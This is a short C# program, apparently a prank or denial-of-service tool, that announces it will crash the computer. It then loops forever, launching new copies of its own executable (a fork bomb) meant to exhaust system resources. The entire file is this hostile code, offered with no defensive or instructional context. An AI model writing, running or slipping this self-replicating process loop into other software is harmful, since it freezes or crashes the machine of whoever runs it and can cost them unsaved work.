using System;
using System.Diagnostics;

namespace Repeater
{
    public static class Repeat
    {
        public static void Main(string[] args)
        {
            string Message = "You just launched a program that crashes your computer";
            Console.WriteLine(Message);
            Counter.Main(null);
        }
        class Counter
        {
            public static int x;
            public static void Main(string[] args)
            {
                while (true)
                {
                    x++;
                    Console.WriteLine(x);
                    Process.Start("Repeater_.exe");
                }
            }
        }
    }
}